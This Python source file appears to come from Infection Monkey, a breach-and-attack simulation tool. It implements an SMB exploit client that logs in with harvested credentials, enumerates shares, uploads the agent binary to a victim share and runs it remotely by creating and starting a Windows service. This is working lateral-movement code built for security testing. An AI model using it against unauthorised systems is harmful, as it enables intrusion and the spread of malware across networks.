import logging
import ntpath
from io import BytesIO
from pathlib import PurePath
from typing import Any, Dict, Optional, Sequence, Tuple

from impacket.dcerpc.v5 import scmr, srvs, transport
from impacket.smbconnection import SMBConnection

from common.agent_plugins import RemoteCopyFileError
from common.credentials import Credentials
from common.event_queue import IAgentEventPublisher
from infection_monkey.i_puppet import TargetHost

from .smb_command_builder import build_smb_command
from .smb_options import SMBOptions
from .smb_utils import create_smb_connection, logout_guest, rpc_connect, smb_login

logger = logging.getLogger(__name__)

SERVICE_NAME = "InfectionMonkey"


class SMBExploitClient:
    """Manages the SMB connection, Exploitation events"""

    def __init__(
        self,
        agent_event_publisher: IAgentEventPublisher,
    ):
        self._agent_event_publisher = agent_event_publisher
        self._smb: Optional[SMBConnection] = None

    def authenticate(self, host: TargetHost, options: SMBOptions, credentials: Credentials) -> bool:
        """Returns True if authentication succeeded, False otherwise
        Side effect: The SMB connection is established on success"""

        self._smb = create_smb_connection(host)
        if not self._smb:
            return False

        if not smb_login(self._smb, credentials):
            return False

        self._smb.setTimeout(options.smb_connect_timeout)

        if logout_guest(self._smb):
            return False

        return True

    def execute(
        self,
        host: TargetHost,
        path: str,
        dest_path: str,
        servers: Sequence[str],
        current_depth: int,
        credentials: Credentials,
        options: SMBOptions,
    ):
        rpc = self._connect_rpc(host, credentials, options.smb_connect_timeout)
        command = build_smb_command(servers, current_depth, path, dest_path)

        rpc.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(rpc)
        sc_handle = resp["lpScHandle"]

        try:
            resp = scmr.hRCreateServiceW(
                rpc,
                sc_handle,
                SERVICE_NAME,
                SERVICE_NAME,
                lpBinaryPathName=command,
            )
        except scmr.DCERPCSessionError as err:
            if err.error_code == 0x431:
                logger.debug(f"Service '{SERVICE_NAME}' already exists, trying to start it")
                resp = scmr.hROpenServiceW(rpc, sc_handle, SERVICE_NAME)
            else:
                raise err

        service_handle = resp["lpServiceHandle"]
        scmr.hRStartServiceW(rpc, service_handle)
        scmr.hRDeleteService(rpc, service_handle)
        scmr.hRCloseServiceHandle(rpc, service_handle)

    def _connect_rpc(self, host, credentials, timeout):
        return rpc_connect(host, 139, credentials, timeout) or rpc_connect(
            host, 445, credentials, timeout
        )

    def copy_file(
        self,
        host: TargetHost,
        file: BytesIO,
        path: PurePath,
        credentials: Credentials,
        options: SMBOptions,
    ) -> str:
        if not self._query_server_info():
            raise RemoteCopyFileError("No server information is available")

        shares = self._query_shares(host, path)
        for remote_path, share_name, share_path in self._connected_shares(
            host, shares, credentials
        ):
            logger.debug(
                f"Trying to copy monkey file to share '{share_name}' [%s + %s] on victim {host}",
                share_path,
                remote_path,
            )

            try:
                self._smb.setTimeout(options.agent_binary_upload_timeout)
                self._smb.putFile(share_name, remote_path, file.read)

                logger.info(
                    f"Copied monkey agent to remote share '{share_name}' "
                    f"[{share_path}] on victim {host}"
                )

                return ntpath.join(share_path, remote_path.strip(ntpath.sep))
            except Exception as exc:
                error_message = (
                    f"Error uploading monkey to share '{share_name}' on victim {host}: {exc}"
                )
                logger.error(error_message)
                raise RemoteCopyFileError(error_message)

    def _query_server_info(self):
        try:
            info = self._execute_rpc_call(srvs.hNetrServerGetInfo, 102)
        except Exception as err:
            logger.debug(f"Failed to query server info: {err}")
            return None

        return info

    def _execute_rpc_call(self, rpc_func, *args):
        """Executes an RPC call using DCE/RPC"""
        rpctransport = transport.SMBTransport(
            self._smb.getRemoteHost(),
            self._smb.getRemoteHost(),
            filename=r"\srvsvc",
            smb_connection=self._smb,
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(srvs.MSRPC_UUID_SRVS)

        return rpc_func(dce, *args)

    def _query_shares(self, host: TargetHost, path: PurePath):
        resp = self._query_shared_resources()
        if not resp:
            return ()

        high_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        low_priority_shares: Tuple[Tuple[str, Dict[str, Any]], ...] = ()
        file_name = path.name

        for i in range(len(resp)):
            share_name = resp[i]["shi2_netname"].strip("\0 ")
            share_path = resp[i]["shi2_path"].strip("\0 ")
            current_uses = resp[i]["shi2_current_uses"]
            max_uses = resp[i]["shi2_max_uses"]

            if current_uses >= max_uses:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because max uses is exceeded",
                    host,
                )
                continue
            elif not share_path:
                logger.debug(
                    f"Skipping share '{share_name}' on victim %r because share path is invalid",
                    host,
                )
                continue

            share_info = {"share_name": share_name, "share_path": share_path}

            if str(path).lower().startswith(share_path.lower()):
                high_priority_shares += ((ntpath.sep + str(path)[len(share_path) :], share_info),)

            low_priority_shares += ((ntpath.sep + file_name, share_info),)

        return high_priority_shares + low_priority_shares

    def _query_shared_resources(self):
        try:
            shares = self._execute_rpc_call(srvs.hNetrShareEnum, 2)
        except Exception as err:
            logger.debug(f"Failed to query shared resources: {err}")
            return None

        return shares

    def _connected_shares(self, host: TargetHost, shares, credentials: Credentials):
        """Yields a tuple of (remote_path, share_name, share_path)
        Side effect: the SMBConnection is connected to the share"""
        # Attempt to connect to a share over SMB
        for remote_path, share in shares:
            share_name = share["share_name"]
            share_path = share["share_path"]

            # TODO: Do we really need to handle reconnects?
            if not self._smb:
                self._connect_with_user(host, credentials)
                if not self._smb:
                    break

            try:
                self._smb.connectTree(share_name)
            except Exception as exc:
                logger.error(
                    f'Error connecting tree to share "{share_name}" on victim {host}: {exc}'
                )
                continue

            yield remote_path, share_name, share_path

    def _connect_with_user(self, host: TargetHost, credentials: Credentials) -> bool:
        self._smb = create_smb_connection(host)
        if not self._smb:
            return False

        self._smb = smb_login(self._smb, credentials)
        if not self._smb:
            return False

        return True
